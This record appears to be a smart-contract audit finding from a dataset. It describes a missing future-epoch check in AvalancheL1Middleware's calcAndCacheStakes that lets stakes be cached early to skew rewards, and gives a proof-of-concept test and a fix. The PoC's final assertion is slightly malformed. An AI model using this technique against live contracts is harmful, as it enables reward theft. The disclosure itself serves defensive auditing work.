# [H] Future epochcache manipulation via calcAndCacheStakes allows reward manipulation

## Summary
Severity: High
Contest weight: 1.0000
Dataset id: 23577
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The AvalancheL1Middleware::calcAndCacheStakes function lacks epoch validation, allowing attackers to cache stake values for future epochs. This enables permanent manipulation of reward calculations by locking in current stake values that may become stale by the time those epochs arrive.  

The `calcAndCacheStakes` function does not validate that the provided epoch is not in the future:

```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 epochStartTs = getEpochStartTs(epoch); // No validation of epoch timing
    // ... rest of function caches values for any epoch, including future ones
}
```

When `totalStakeCached` flag is set, any subsequent call to `getOperatorStake` for that epoch and asset class will return the incorrect `operatorStakeCache` value:

```solidity
function getOperatorStake(
    address operator,
    uint48 epoch,
    uint96 assetClassId
) public view returns (uint256 stake) {
    if (totalStakeCached[epoch][assetClassId]) {
        uint256 cachedStake = operatorStakeCache[epoch][assetClassId][operator];
        return cachedStake;
    }
    ...
}
```

When called with a future epoch, the function queries current stake values using checkpoint systems (`upper-LookupRecent`) which return the latest available values for future timestamps.  

Impact:  
- Attackers can inflate their reward shares by locking in high stake values before their actual stakes decrease. All subsequent deposits/withdrawals will not impact the cached stake once it gets updated for a given epoch.  
- `forceUpdateNodes` mechanism can be compromised. Critical node rebalancing operations can be incorrectly skipped, leaving the system in an inconsistent state.

## Proof of Concept
Add the following test and run it:

```solidity
function test_operatorStakeOfTwoEpochsShouldBeEqual() public {
    uint256 operatorStake = middleware.getOperatorStake(alice, 1, assetClassId);
    console2.log("Operator stake (epoch", 1, "):", operatorStake);
    middleware.calcAndCacheStakes(5, assetClassId);
    uint256 newStake = middleware.getOperatorStake(alice, 2, assetClassId);
    console2.log("New epoch operator stake:", newStake);
    assertGe(newStake, operatorStake);
    uint256 depositAmount = 100_000_000_000_000_000_000;
    collateral.transfer(staker, depositAmount);
    vm.startPrank(staker);
    collateral.approve(address(vault), depositAmount);
    vault.deposit(staker, depositAmount);
    vm.stopPrank();
    vm.warp((5) * middleware.EPOCH_DURATION());
    middleware.calcAndCacheStakes(5, assetClassId);
    assertEq(
        middleware.getOperatorStake(alice, 4, assetClassId), middleware.getOperatorStake(alice, 5,
        assetClassId),!
    );
}
```

## Recommendation
Consider adding epoch validation to prevent future epoch caching:

```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 currentEpoch = getCurrentEpoch();
    require(epoch <= currentEpoch, "Cannot cache future epochs"); //@audit added
    uint48 epochStartTs = getEpochStartTs(epoch);
    // ... rest of function unchanged
}
```
